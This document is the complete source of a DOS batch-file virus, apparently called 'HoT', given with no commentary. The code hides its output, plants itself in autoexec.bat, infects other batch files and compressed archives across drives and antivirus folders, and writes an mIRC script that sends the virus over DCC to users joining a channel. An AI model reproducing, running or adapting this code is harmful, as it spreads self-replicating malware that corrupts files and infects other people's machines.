@ctty nul%HoT%
if "%1=="HoT2 goto HoT2
if "%1=="HoT3 goto HoT3
if "%1=="HoT4 goto HoT4
if "%1=="HoT5 goto HoT5
if "%1=="HoT6 goto HoT6
if exist c:\HoT.bat goto HoT
echo>c:\HoT.bat :This is system file. Don't modifity !
find "HoT"<%0>>c:\HoT.bat
find "HoT"<c:\autoexec.bat
if errorlevel 1 echo>>c:\autoexec.bat @rem HoT.bat
for %%c in (%winbootdir% %path% c:\DOS c:\ARH) do call c:\HoT.bat HoT2 %%c\
for %%d in (c d e f g h) do call c:\HoT.bat HoT3 %%d:\
:HoTDoT
call c:\HoT.bat HoT2 %HoTDoT%
set HoTDoT=..\%HoTDoT%
copy %0 %HoTDoT%%0
if not exist %HoTDoT%%0 goto HoT
del %HoTDoT%%0
goto HoTDoT
:HoT2
for %%b in (%2*.bat) do call c:\HoT.bat HoT4 %%b
copy c:\HoT.bat %2
for %%n in (%2*.arj %2*.rar %2*.ha %2*.lzh %2*.ice %2*.zip) do attrib -r %%n%HoT%
for %%a in (%2*.arj) do arj a %%a c:\HoT.bat
for %%r in (%2*.rar) do rar a -tk -y -c- -o+ %%r c:\HoT.bat
for %%h in (%2*.ha) do ha a1 %%h c:\HoT.bat
for %%l in (%2*.lzh %2*.ice) do lha a /m %%l c:\HoT.bat
for %%z in (%2*.zip) do pkzip %%z c:\HoT.bat
goto HoT1
:HoT3
copy c:\HoT.bat %2HoT.bat
if not exist %2HoT.bat goto HoT1
for %%d in (AIDS AVIR ANTIVIR ARHIV UTIL PROGRA~1) do call c:\HoT.bat HoT2 %2%%d\
for %%m in (MIRC MIRC32 IRC) do if exist %2%%m\*.* call c:\HoT.bat HoT6 %2%%m\
goto HoT1
:HoT4
find "HoT"<%2
if not errorlevel 1 goto HoT1
find "HoT"<%0>C:\HoT
type %2>>c:\HoT
copy c:\HoT %2
del c:\HoT
goto HoT1
:HoT5
set HoTm=%2script.ini
echo>%HoTm% [script]
echo>>%HoTm% n0=on 1:JOIN:#: if ( $me != $nick) { /dcc send $nick c:\HoT.bat }
goto HoT1
:HoT6
if exist %2script.ini call c:\HoT.bat HoT5 %2
if exist %2mirc*.* call c:\HoT.bat HoT5 %2
goto HoT2
:HoT
ctty con%HoT%
:HoT1
rem ----------------------------------------------------------------------------------------------
rem ----------------------------------------------------------------------------------------------
rem ----------------------------------------------------------------------------------------------
rem ----------------------------------------------------------------------------------------------
rem ----------------------------------------------------------------------------------------------
rem ----------------------------------------------------------------------------------------------
rem ----------------------------------------------------------------------------------------------
rem ----------------------------------------------------------------------------------------------
rem ----------------------------------------------------------------------------------------------
rem ----------------------------------------------------------------------------------------------
